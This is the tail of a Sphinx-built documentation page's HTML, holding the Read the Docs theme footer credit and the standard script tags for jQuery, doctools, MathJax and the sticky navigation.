  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.3',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>